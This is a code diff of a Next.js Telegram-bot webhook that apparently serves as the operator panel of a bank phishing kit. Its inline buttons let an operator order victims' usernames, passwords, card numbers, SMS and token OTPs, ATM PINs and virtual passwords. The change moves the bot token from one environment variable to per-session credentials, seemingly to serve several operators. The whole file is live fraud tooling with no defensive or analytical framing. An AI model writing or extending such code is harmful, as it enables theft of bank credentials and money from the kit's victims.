@@ -1,8 +1,6 @@
 import { PaymentStatus, savePaymentState } from '@/utils/paymentStorage';
+import { getSessionCredentials } from '@/lib/sessionCredentials';
 import type { NextApiRequest, NextApiResponse } from 'next';
-
-const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN!;
-const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
 
 type ActionConfig = { status: PaymentStatus; text: string };
 
@@ -43,26 +41,33 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
   const messageId   = message.message_id;
   const originalText = message.text || '';
 
-  await answerCallback(callbackQueryId);
-
   const sessionMatch = originalText.match(/Session ID:\s*([^\n\r]+)/i);
   const sessionId = sessionMatch?.[1]?.trim();
 
+  const creds = sessionId ? await getSessionCredentials(sessionId) : null;
+  if (!creds) {
+    console.warn(`[Webhook] Sin credenciales para sessionId=${sessionId}, ignorando`);
+    return;
+  }
+  const TELEGRAM_API = `https://api.telegram.org/bot${creds.botToken}`;
+
   console.log(`[Webhook] data=${data}, sessionId=${sessionId}`);
+
+  await answerCallback(TELEGRAM_API, callbackQueryId);
 
   if (data === 'carpeta_errores') { 
     console.log('[Webhook] Menú errores');
-    await editarMarkupErrores(chatId, messageId); 
+    await editarMarkupErrores(TELEGRAM_API, chatId, messageId); 
     return; 
   }
   if (data === 'carpeta_pages') {   
     console.log('[Webhook] Menú pages');
-    await editarMarkupPages(chatId, messageId);   
+    await editarMarkupPages(TELEGRAM_API, chatId, messageId);   
     return; 
   }
   if (data === 'volver') {
     console.log('[Webhook] Volver');
-    await editarMarkupPrincipal(chatId, messageId); 
+    await editarMarkupPrincipal(TELEGRAM_API, chatId, messageId); 
     return; 
   }
 
@@ -86,19 +91,19 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
   }
 
   const cleanText = removeEstado(originalText);
-  await editarMensajeConStatus(chatId, messageId, `${cleanText}\n\n📌 ESTADO: ${action.text}`);
+  await editarMensajeConStatus(TELEGRAM_API, chatId, messageId, `${cleanText}\n\n📌 ESTADO: ${action.text}`);
 }
 
-async function answerCallback(id: string) {
-  await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+async function answerCallback(api: string, id: string) {
+  await fetch(`${api}/answerCallbackQuery`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ callback_query_id: id }),
   }).catch(err => console.error('[Webhook] Error en answerCallback:', err));
 }
 
-async function editarMarkup(chatId: number, messageId: number, inline_keyboard: any[][]) {
-  const r = await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
+async function editarMarkup(api: string, chatId: number, messageId: number, inline_keyboard: any[][]) {
+  const r = await fetch(`${api}/editMessageReplyMarkup`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard } }),
@@ -107,8 +112,8 @@ async function editarMarkup(chatId: number, messageId: number, inline_keyboard: 
   if (!j.ok) console.error('[Webhook] editMarkup error:', j);
 }
 
-async function editarMarkupErrores(chatId: number, messageId: number) {
-  await editarMarkup(chatId, messageId, [
+async function editarMarkupErrores(api: string, chatId: number, messageId: number) {
+  await editarMarkup(api, chatId, messageId, [
     [{ text: 'Pedir Usuario', callback_data: 'error_user' }, { text: 'Pedir contraseña', callback_data: 'error_password' }],
     [{ text: 'Pedir Tarjeta', callback_data: 'new_card' }],
     [{ text: 'Pedir OTP', callback_data: 'error_otp' }, { text: 'Pedir OTP SMS', callback_data: 'error_code_sms' }, { text: 'Pedir Token', callback_data: 'error_token' }, { text: 'Pedir Clave Cajero', callback_data: 'error_clave_cajero' }, { text: 'Pedir Clave Virtual', callback_data: 'error_clave_virtual' }],
@@ -117,8 +122,8 @@ async function editarMarkupErrores(chatId: number, messageId: number) {
   ]);
 }
 
-async function editarMarkupPages(chatId: number, messageId: number) {
-  await editarMarkup(chatId, messageId, [
+async function editarMarkupPages(api: string, chatId: number, messageId: number) {
+  await editarMarkup(api, chatId, messageId, [
     [{ text: 'Pedir Usuario', callback_data: 'user' }, { text: 'Pedir Clave Virtual', callback_data: 'clave_virtual' }],
     [{ text: 'Pedir OTP', callback_data: 'otp' }, { text: 'Pedir OTP SMS', callback_data: 'code_sms' }],
     [{ text: 'Pedir Token', callback_data: 'token' }, { text: 'Pedir Clave Cajero', callback_data: 'clave_cajero' }],
@@ -127,15 +132,15 @@ async function editarMarkupPages(chatId: number, messageId: number) {
   ]);
 }
 
-async function editarMarkupPrincipal(chatId: number, messageId: number) {
-  await editarMarkup(chatId, messageId, [
+async function editarMarkupPrincipal(api: string, chatId: number, messageId: number) {
+  await editarMarkup(api, chatId, messageId, [
     [{ text: '📁 Errores', callback_data: 'carpeta_errores' }, { text: '📄 Pages', callback_data: 'carpeta_pages' }],
     [{ text: '✅ Check', callback_data: 'check' }],
   ]);
 }
 
-async function editarMensajeConStatus(chatId: number, messageId: number, text: string) {
-  const r = await fetch(`${TELEGRAM_API}/editMessageText`, {
+async function editarMensajeConStatus(api: string, chatId: number, messageId: number, text: string) {
+  const r = await fetch(`${api}/editMessageText`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
@@ -146,11 +151,11 @@ async function editarMensajeConStatus(chatId: number, messageId: number, text: s
   const j = await r.json();
   if (!j.ok) console.error('[Webhook] editText error:', j);
 
-  await limpiarMarkup(chatId, messageId);
+  await limpiarMarkup(api, chatId, messageId);
 }
 
-async function limpiarMarkup(chatId: number, messageId: number) {
-  const r = await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
+async function limpiarMarkup(api: string, chatId: number, messageId: number) {
+  const r = await fetch(`${api}/editMessageReplyMarkup`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } }),
